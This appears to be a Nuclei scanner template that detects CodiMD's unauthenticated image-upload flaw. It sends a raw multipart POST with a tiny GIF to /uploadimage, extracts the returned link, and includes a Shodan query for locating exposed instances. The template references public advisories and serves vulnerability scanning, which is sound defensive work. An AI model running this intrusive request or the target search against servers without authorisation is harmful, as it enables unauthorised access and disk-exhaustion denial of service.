http:
- extractors:
  - group: 1
    part: body
    regex:
    - '"link":"(.*)"'
    type: regex
  matchers:
  - part: body
    regex:
    - '"link":".*?.gif"'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /uploadimage HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161


    -----------------------------92633278134516118923780781161

    Content-Disposition: form-data; name="image"; filename="{{randstr}}.gif"

    Content-Type: image/gif


    {{base64_decode("R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==")}}

    -----------------------------92633278134516118923780781161--

    '
id: codimd-unauth-file-upload
info:
  author: denandz,PulseSecurity.co.nz
  description: 'CodiMD does not require valid authentication to access uploaded images
    or to upload new image data. An attacker who can determine an uploaded image''s
    URL can gain unauthorised access to uploaded image data, or can create a denial
    of service condition by exhausting all available disk space.

    '
  metadata:
    max-request: 1
    shodan-query: html:"CodiMD"
    verified: true
  name: CodiMD - File Upload
  reference:
  - https://github.com/hackmdio/codimd/security/advisories/GHSA-2764-jppc-p2hm
  - https://pulsesecurity.co.nz/advisories/codimd-missing-image-access-controls
  severity: medium
  tags: file-upload,intrusive,codimd,vuln
